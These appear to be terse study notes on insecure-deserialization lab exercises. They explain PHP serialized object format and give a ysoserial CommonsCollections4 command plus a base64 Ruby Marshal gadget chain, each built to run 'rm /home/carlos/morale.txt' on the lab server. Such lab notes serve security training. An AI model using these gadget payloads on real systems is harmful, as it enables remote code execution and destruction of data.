[#](#) Deserialization

`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`

    This can be interpreted as follows:
    
    O:4:"User" - An object with the 4-character class name "User"
    2 - the object has 2 attributes
    s:4:"name" - The key of the first attribute is the 4-character string "name"
    s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
    s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
    b:1 - The value of the second attribute is the boolean value true

Can you read the source code?

    /libs/CustomTemplate.php
   
        Nothing
        
    /libs/CustomTemplate.php~
    
        <?php...

Burp Active detects Serialize objects

    Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBybHcxaGs4cDg5YmE2MjJnNm93NTh0amVnaHB5cWpkbHQABndpZW5lcg%3d%3d
    
        base64decoded -> ...lab.actions.common.serializable.AccessTokenUser...
    
    java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
        
        - base64_output
        - URL_Encode
        - Replace cookie
        - Receive 500: InstantiateTransformer: Constructor threw an exception
        - Solved!

Ruby (Marshal)

    I try to use the online compiler (or locally) but the script provided never worked. (https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
    
    BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
